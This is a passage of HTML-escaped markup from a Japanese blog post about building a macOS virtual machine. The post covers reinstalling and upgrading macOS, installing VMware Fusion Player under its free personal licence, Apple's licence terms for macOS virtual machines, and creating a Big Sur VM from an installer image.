url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAYAAACQjC21AAAACXBIWXMAAAsTAAALEwEAmpwYAAACN0lEQVQ4y5WTzXLSUBTHeQexlBA+WgoEAkn4SqgFKQgFIk1pocO4cdw448aNblw4bnTle/gGvoUuHDc+zt97bnsyNzZUXfw5NyHndz5vIlPQQNLy6Tvi/+K06/vELmf9IPNXxQVIxEVOx0TfJQ7O/gk1GtlKrYS6WUalXkbZLIUyGhWpqmWEom9UX1JCjaDl9jFbP8WLz+8RbAIEV0sE63Osri8w9ScYnZ1iOHksdTodojfwIsBohkJaNoXZ5hybD2+x2q7gB3P4Fwup2fIMC/HMULIE5FKzh/pNhvRDD/IPce70mrjcztHyHDhdB003Xi2vCavdCDMjBikEZg90pApJLNw1vr76juXER3/ax5P5GOPZSGblPurC7lio2dWwpyowkqFeELaYEQNxMNCuYVsOao6BetMMZTo1aQnIg+GW3QHKssVQeiKby4+f0Bsei5JvsiEQW4aSvR9YzCKdSWK02eDllx8Y+3O4J21YokTqV7vXCq170pVnCsLJhEA65ASMX5riI0841W73jLLg/eO+qfvIfsyQwPxRTiqZfoDt82f49usnJv4UneM2vL4r14OGYd9m63RtNFr1CJD8JZDI9EA2LXo4GPfx+t0b2cO66BOtBoEIQGeCkahcukEqkBghkNM2RJkF8UzReRjqQHhlaMnp9tB9jmSo1k/7JAOU8pFmx+moWkTROJRA8on0kKE0pX1x/f5Fe5mHSOl70kcdamQPufz/kQoL1+ZPKIsd7nunwsj+BjhnLE4e9s/dAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/a026780da82d130498c68b6f20d52ab9/8ac56/image-20220228215319901.webp 240w,
/static/a026780da82d130498c68b6f20d52ab9/c2de8/image-20220228215319901.webp 362w&quot;
              sizes=&quot;(max-width: 362px) 100vw, 362px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/a026780da82d130498c68b6f20d52ab9/8ff5a/image-20220228215319901.png 240w,
/static/a026780da82d130498c68b6f20d52ab9/10600/image-20220228215319901.png 362w&quot;
            sizes=&quot;(max-width: 362px) 100vw, 362px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/a026780da82d130498c68b6f20d52ab9/10600/image-20220228215319901.png&quot;
            alt=&quot;image-20220228215319901&quot;
            title=&quot;image-20220228215319901&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;僕の環境ではディスクユーティリティから既存のパーティションをすべて削除した上でパーティションを再構成し、インターネット経由でMac OSを再インストールしました。&lt;/p&gt;
&lt;p&gt;ちなみに、今回は使用しませんでしたが以下のようにインストールメディアからのインストールも可能なようです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://support.apple.com/ja-jp/HT211683&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;以前のバージョンの macOS を入手する - Apple サポート (日本)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://support.apple.com/ja-jp/HT201372&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;macOS の起動可能なインストーラを作成する方法 - Apple サポート (日本)&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;mac-osをアップグレードする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#mac-os%E3%82%92%E3%82%A2%E3%83%83%E3%83%97%E3%82%B0%E3%83%AC%E3%83%BC%E3%83%89%E3%81%99%E3%82%8B&quot; aria-label=&quot;mac osをアップグレードする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Mac OSをアップグレードする&lt;/h2&gt;
&lt;p&gt;インストールが完了したらAppleIDと連携した後、[システム環境設定]&gt;[ソフトウェア・アップデート]を開き、アップデートを実行します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 696px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/ed28ed22d50aa76a3efeacc8f6054dca/82158/image-20220228220157397.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 38.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABp0lEQVQoz01S23aaQBTlI9pYtQjMwHAHDQjIRSMtTUw1yepLktq+1ZX8/w/snBm72jzstffZzLnNoCWiQGqvkPICEW8Q22tCh0TCIc1b4k55gVURSsURr8lv4VPsmxV8liEZPUHjTMCcChgTG5buwDY9CBbAsXylueEqfh9zwyPtw+Uh+QGERcwchKMDNH1soiy3aNYDHUgw+2TDNkLkaY1NM2A33OF2uFdaefVXtGWvsFw08HhKBWMI7iMY3UNbFjV+n15x/HPCj8cjmE7djUAd7rtrStyiytYIxQK+nSLyLpWO3DO7LIarCno04QO0ttvg9PKCx+cnPB9/wTFpfJpQWNFZ/4WMZfJ7T0J6Hkv+F+Smi+HLNe72B2RpqVY+F4vU6gqz4B+EKQsnairJ0uM6fbNcRHJl47OFKm8x9DvqEmI2YXTBAeZxjmW2QpHXWJUdKomiReTPKZkejgdgpsCm67H7tkeWZYjH9CizC+owWUBMc7CLBawPc4hxjkhv0Pg3GC4f0KcHXMXf0YW3WLItUp1+KZ3uddqhcG+wCvZI2RUWH3/iDf9z9ztnZUKUAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/ed28ed22d50aa76a3efeacc8f6054dca/8ac56/image-20220228220157397.webp 240w,
/static/ed28ed22d50aa76a3efeacc8f6054dca/d3be9/image-20220228220157397.webp 480w,
/static/ed28ed22d50aa76a3efeacc8f6054dca/038cb/image-20220228220157397.webp 696w&quot;
              sizes=&quot;(max-width: 696px) 100vw, 696px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/ed28ed22d50aa76a3efeacc8f6054dca/8ff5a/image-20220228220157397.png 240w,
/static/ed28ed22d50aa76a3efeacc8f6054dca/e85cb/image-20220228220157397.png 480w,
/static/ed28ed22d50aa76a3efeacc8f6054dca/82158/image-20220228220157397.png 696w&quot;
            sizes=&quot;(max-width: 696px) 100vw, 696px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/ed28ed22d50aa76a3efeacc8f6054dca/82158/image-20220228220157397.png&quot;
            alt=&quot;image-20220228220157397&quot;
            title=&quot;image-20220228220157397&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;しばらく待つとアップグレードが完了します。&lt;/p&gt;
&lt;h2 id=&quot;vmware-fusion-playerをインストールする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#vmware-fusion-player%E3%82%92%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B&quot; aria-label=&quot;vmware fusion playerをインストールする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;VMWare Fusion Playerをインストールする&lt;/h2&gt;
&lt;p&gt;VMware Fusionは、MacOS上で実行できるホスト型のハイパーバイザです。&lt;/p&gt;
&lt;p&gt;Windowsなどで使えるVMWare Workstationと同様にProとPlayerのエディションが存在し、Fusion Playerは無料での個人利用が可能です。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.vmware.com/jp/products/fusion/faq.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;VMware Fusion の概要 | FAQ | JP&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Windowsなどで使えるWorkstation Playerの場合は、残念ながら無料ライセンスでは仮想化の最大のメリットともいえるスナップショット機能が使用できません。&lt;/p&gt;
&lt;p&gt;しかし、なんとVMware Fusionは個人用の無料ライセンスでもスナップショット機能が使えるのです。&lt;/p&gt;
&lt;p&gt;これは素晴らしい。&lt;/p&gt;
&lt;p&gt;VMWare Fusionは以下のダウンロードページからダウンロード可能です。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://customerconnect.vmware.com/downloads/info/slug/desktop_end_user_computing/vmware_fusion/12_0&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Download VMware Fusion 12 - VMware Customer Connect&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;インストーラをダウンロードできたら、次に以下のページにVMWareアカウントでログインして個人利用用のライセンスを取得します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://customerconnect.vmware.com/web/vmware/evalcenter?p=fusion-player-personal&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;VMware Fusion Player – Personal Use License&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;VMWareアカウントがない場合はアカウント作成が必要です。&lt;/p&gt;
&lt;p&gt;作成できたら「VMware Fusion Player – Personal Use」というライセンスが取得できます。&lt;/p&gt;
&lt;p&gt;あとはダウンロードしたインストーラを実行して取得したライセンスを登録すればOKです。&lt;/p&gt;
&lt;h3 id=&quot;仮想マシンのmacosライセンスについて&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E4%BB%AE%E6%83%B3%E3%83%9E%E3%82%B7%E3%83%B3%E3%81%AEmacos%E3%83%A9%E3%82%A4%E3%82%BB%E3%83%B3%E3%82%B9%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;仮想マシンのmacosライセンスについて permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;仮想マシンのMacOSライセンスについて&lt;/h3&gt;
&lt;p&gt;仮想マシンを作成する前にMacOSの仮想マシンのライセンスについて確認しておきます。&lt;/p&gt;
&lt;p&gt;Appleのライセンスを読むと、MacOSの仮想マシンは、Mac端末上でのみ最大2つのコピーを使用することができると書かれています。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(iii) to install, use and run up to two (2) additional copies or instances of the Apple Software, or any prior macOS or OS X operating system software or subsequent release of the Apple Software, within virtual operating system environments on each Apple-branded computer you own or control that is already running the Apple Software, for purposes of: (a) software development; (b) testing during software development; (c) using macOS Server; or (d) personal, non-commercial use.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.apple.com/legal/sla/docs/macOSMonterey.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;macOS Monterey License&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;MacOSの仮想マシンを構築するのはOKですが、あくまでMac端末上でのみ許可されるという点に注意が必要ですね。&lt;/p&gt;
&lt;h3 id=&quot;インストール用のosを取得する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E7%94%A8%E3%81%AEos%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot; aria-label=&quot;インストール用のosを取得する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;インストール用のOSを取得する&lt;/h3&gt;
&lt;p&gt;インストールしたFusion Playerを起動すると、以下のような仮想マシンのセットアップ画面がでてきます。&lt;/p&gt;
&lt;p&gt;ここで、「リカバリパーティションからMacOSをインストール」を選択すると、現在使用しているOSと同じバージョンの仮想マシンを簡単に立てることができます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 649px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/b4df7f7aff16130cd0cfcaed8572e9b8/7762d/image-20220228222728117.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 83.33333333333334%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAAAsTAAALEwEAmpwYAAACfUlEQVQ4y11T227bMAw1sK7d2q5Jc7FlWZIdW7ZzcW5okqXNQx4KbMMwYP//NWciHTvuHg5ISTzUoUh5WWqRpRmMNtAOjY0i1UI5yFAiFBJChAgCAaV0G6tbbgxPG+0OiRi10FqjLEvMZjO2WZZhs9lgv9/jeDzifD4jTVNIKRGpK08536tVRB9gjOFk8/mc7XQ6xXa75YRvb28fEnbFkM8JyVFOFYHUUTlUGkHKiCFCWgv4QQDf9/kp9AdOncdTF4WBCxQOAcNHkiSslHwh6jOyoUtKoP0u6NI6IasJ8PXGw/1nD1+cfX78hNU8xW4zw+DbDcTwAdJ/wqh/h2HvFsHwHqPencMtnxPXH4+4MR5lpbd47j1g0H9kOx72MCstbBpD+EOnaIQodEqDIfxRH1oJtqPBE4M49BxUvtc8pjZxDWq/SZDZnFEUU9i8gLUFr8mvqiXiZOJ4NC41jyrtNOXaJa2brskaTr28oF27BhGn6XCX33Y5dEFFUfBoNONAoFKstXzGZV32qdO73Q6LxYIb2Xa5SUhJiERB15sVlsslXl5eeLCrquIRyfOc9wir1YovbEbnOoeXJF11tKafQphMJkxszuI4bn1K1pZ8nUPBs0eKqLQmYDwet7+G/P+/aRetQhrgsiixXq9xOBz4W8VxwgHkv76+4nQ68ZNQbENWneraN5Qy5IBkkrgkhrtM5RlTl1GXmrF6sqqZAlWD+PyTuCoJz6YF8mzqBrnCYu4eOC0RCZdYuvmKnMow5jXbkPYT3uczF0Pxq2qLynHTJIdXphXW8z3ez7/w8/0PttV36CBDLHOYMGfbBe2Z0LKvRea+6A6/f/xl/tSu8A9c58w8tNayMwAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/b4df7f7aff16130cd0cfcaed8572e9b8/8ac56/image-20220228222728117.webp 240w,
/static/b4df7f7aff16130cd0cfcaed8572e9b8/d3be9/image-20220228222728117.webp 480w,
/static/b4df7f7aff16130cd0cfcaed8572e9b8/df8c5/image-20220228222728117.webp 649w&quot;
              sizes=&quot;(max-width: 649px) 100vw, 649px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/b4df7f7aff16130cd0cfcaed8572e9b8/8ff5a/image-20220228222728117.png 240w,
/static/b4df7f7aff16130cd0cfcaed8572e9b8/e85cb/image-20220228222728117.png 480w,
/static/b4df7f7aff16130cd0cfcaed8572e9b8/7762d/image-20220228222728117.png 649w&quot;
            sizes=&quot;(max-width: 649px) 100vw, 649px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/b4df7f7aff16130cd0cfcaed8572e9b8/7762d/image-20220228222728117.png&quot;
            alt=&quot;image-20220228222728117&quot;
            title=&quot;image-20220228222728117&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;しかし、今回は検証用のマシンを作成したいので、一つ前のBig Surをインストールしていきます。&lt;/p&gt;
&lt;p&gt;そのため、まずはOSイメージを取得します。&lt;/p&gt;
&lt;p&gt;OSイメージはApp Storeからダウンロード可能ですが、現行バージョンより古いOSイメージはApp Storeのアプリの検索結果には表示されないため、Webから直接リンクにアクセスする必要があります。&lt;/p&gt;
&lt;p&gt;各OSイメージのリンクは、以下の公式ページからアクセスできます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://support.apple.com/ja-jp/HT211683&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;以前のバージョンの macOS を入手する - Apple サポート (日本)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;このURLからApp Storeを開きOSイメージをダウンロードすると、イメージは「Application」ディレクトリに配置されます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 540px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/235c0ba772dab3e2f52f5d26e05f8fbb/07484/image-20220226220901937.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 80%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAADwklEQVQ4y0WUyW4jdRDG/QbAhAmJl3a33d3ubu9re4ljx0tsZ4/HntjYDpkkQmJWQIQDDMsBDgwiQkJCcB6JE1y4MW/BWyDNjRf4Ue5E4lCqpUuf/vXVV+1rGkNOCkPc4pCSNsbVTiga+7iFDcqFTSrFBoPuAf3OPu3GgE5zx6u5+brY5q3/P/Zt6kMOM2PK6ZGAidcmFPQ9cukS+XSFfKZCvdpio7xFtdSgWe9SytXIpVzpKd9YZuldr9fnGvdoxM/YTp5TjoypRKZkwtsEA2GUgEZ4XSG4HiYgFg5FiekOUdXwvilB7bYn4vUYUVsArUP2Ny6ZdD6knTqlGBoJYF+aDMJBhzU1ixq00QKW1EySdklet+HFml9qgRh+QyesxLzct5kYM+k+Y9G7Ytx4Qi99Sck4RLkTxJx8Se/Vv6j9R6h3QljRPL//8YqXv/2JbWQJvqlTPG7y3etfaX19TEhyXzc356T1jOnWR4w3nzJrX1G1hoRWAsR2Pqf/82uijQ9QJI/Hylx98oLvX/xCNlkl+EYUZ6/E4u+nZK+ahN8y8dXsI/arF+xkz2nZMzajU3JKD9Uv41llUukejp6X3CIairPhdmnVd9GVuFez9QzJjRJxJ4e2LhxWZbyT1iMOCpfU1BENASwsOfTHsKPSbOYx1aRwaHuA6rqFsmZ68bKmKQlCqzaK3yEinPvq5hGDzCm7mQcMUu/RMma3gCbVYpP5bE4uWUHzFmPT2upQLddlATECAYe26vDXeMSTYo21tRi+lnmfjvEuDdHg0pqiw5I6ILiii4Db9O7vU8410dYc/CsqD68+5vlnXxG6G2FVAM8Vk3+++YJFdxf/XVnKluhwKOPOGo85KlwwsE8pKQOcTILBYo/dx2d0px1MxyEuW86ka5iRFHE9J2PaVMwcfTOFFXeJLkdumfc4zp3LtTzgIH1G31pQDPSIF5Icfdtm8pOc3qc1DAF0BNDR0lhqCsfIe7qzxSecChmrdMNhyxyxbUxpy7hL60QmVNQ+wVWTREheVSmiaLKMVQtd8s7emN7RFON2KaoIXouIV2449u2YQ8bJBTvxuQAKuADWhMNVOaf3jQ7Pr1/yjvwQ1BWNVKzA+fUPnP54TTlTx/92lFSiyPhsTsxJewrw7VkHzEsLjvMX9GMTD7AaHhDy67hqGbf9kJDpoq4Zoscse8dTDkdzEiKnsABE5NW6HpebNonIkny7yX1m1Zm3mEHshN4SUEZWRRaqNCf0NJFlLOPYAliQC3HldY6Ru9Hhsh7NCh0JL/4PbSUSlPnIetEAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/235c0ba772dab3e2f52f5d26e05f8fbb/8ac56/image-20220226220901937.webp 240w,
/static/235c0ba772dab3e2f52f5d26e05f8fbb/d3be9/image-20220226220901937.webp 480w,
/static/235c0ba772dab3e2f52f5d26e05f8fbb/9e625/image-20220226220901937.webp 540w&quot;
              sizes=&quot;(max-width: 540px) 100vw, 540px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/235c0ba772dab3e2f52f5d26e05f8fbb/8ff5a/image-20220226220901937.png 240w,
/static/235c0ba772dab3e2f52f5d26e05f8fbb/e85cb/image-20220226220901937.png 480w,
/static/235c0ba772dab3e2f52f5d26e05f8fbb/07484/image-20220226220901937.png 540w&quot;
            sizes=&quot;(max-width: 540px) 100vw, 540px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/235c0ba772dab3e2f52f5d26e05f8fbb/07484/image-20220226220901937.png&quot;
            alt=&quot;image-20220226220901937&quot;
            title=&quot;image-20220226220901937&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;あとはこのイメージをFusion PlayerのGUIにドラッグ&amp;#x26;ドロップすると、以下のように仮想マシンの作成に進むことができます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 651px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/4f2f2f93ff31a98e5932337ddb4b2ddf/1ac66/image-20220226220842339.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 83.33333333333334%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAAAsTAAALEwEAmpwYAAAC10lEQVQ4y51Ta1faQBCl9tTWHj3aCuSxj2TzIiESIAgoCFjtqWBb7dHW//9PbmeXh1K/9cM9MzuZuXt3MlM55bfo+hMU/AItd4wWGxubW2conBHa1gAd6xSlM0Tu3SCVc6T8GzIxR1Mu0OQLZGy+hDtHxecNMM+CK2w43ILN6mDSQV5kUJGHvN1EUbagYgUVCqRZiOZJTD6Hw6pUV1+C16i+iopyMsRJhCxtIm+ekM3Q7XRxd3eP4fAMi8Utnv48YXIxwXQ6w83NAo8PvzEeTxCFMdIG1UcJTk5aEFwSoZshCH3EcYI0TdFoNAyiKILv+8iyjIrHKMsSRVEgDEMkSWJytK/z4jg2tYwxerKbggvXHPTH2WxmiF5CxzWBlHIT0/76Ul3LOYfruktCIbkJRFGI0WhkEvVZCGGsLtJqdOE6xskPggBKKXPWFxhCz2nA86nZ1DtNFBK0TempWlWSLJHnOdrtjnlah3pclj0iYAa6Xb6vVgqJUHgk17YguYPAl+h122gXOUIloegy5tRR/XyIevXTxtaOj+BYVUSBR7U1o37TQ8Zd1KpH8BSDUztEK4tQPz7A/oc3ONjbwcfdCt6/3cbuToW+7+Bofxd77yqwbZt4+FKh9EiFLWHXSGmdw666Bk6NGeiYa4lXcCjfNjnUQ+E/91DSkwPRIKQr+69P4C8gXthVri/VmjAxCn0ew2f/D29NKJ3YECqeQLEVyN9SJ16r2son+M+EK4UiJETGejx41S9mSdNn0zvqqWS026t8XefJVQ+FEy03hTPztzVUoGhvJ7iYXGA6m9L2TGn9RjT055hQ/Or6imYzhsscGnRO47Ksd8lWAk7zFoSIQ9rhhPbajwyG/XPCGYaDc5wRBqdD9HtDE7+cfkG3XW5yG3GGJKYf4wWoZKqPshjg5voH7r8/YjyYwdOqLfWMuto6D3tj3N0+4HL8Ff3OOe7J/zn/hU7ex18yL9+RFzgsLAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/4f2f2f93ff31a98e5932337ddb4b2ddf/8ac56/image-20220226220842339.webp 240w,
/static/4f2f2f93ff31a98e5932337ddb4b2ddf/d3be9/image-20220226220842339.webp 480w,
/static/4f2f2f93ff31a98e5932337ddb4b2ddf/be1d0/image-20220226220842339.webp 651w&quot;
              sizes=&quot;(max-width: 651px) 100vw, 651px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/4f2f2f93ff31a98e5932337ddb4b2ddf/8ff5a/image-20220226220842339.png 240w,
/static/4f2f2f93ff31a98e5932337ddb4b2ddf/e85cb/image-20220226220842339.png 480w,
/static/4f2f2f93ff31a98e5932337ddb4b2ddf/1ac66/image-20220226220842339.png 651w&quot;
            sizes=&quot;(max-width: 651px) 100vw, 651px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/4f2f2f93ff31a98e5932337ddb4b2ddf/1ac66/image-20220226220842339.png&quot;
            alt=&quot;image-20220226220842339&quot;
            title=&quot;image-20220226220842339&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;細かいハードウェアのカスタマイズは割愛します。&lt;/p&gt;
&lt;p&gt;これで、MacOS上で仮想MacOSを動かすことができました。&lt;/p&gt;
&lt;p&gt;&lt;span
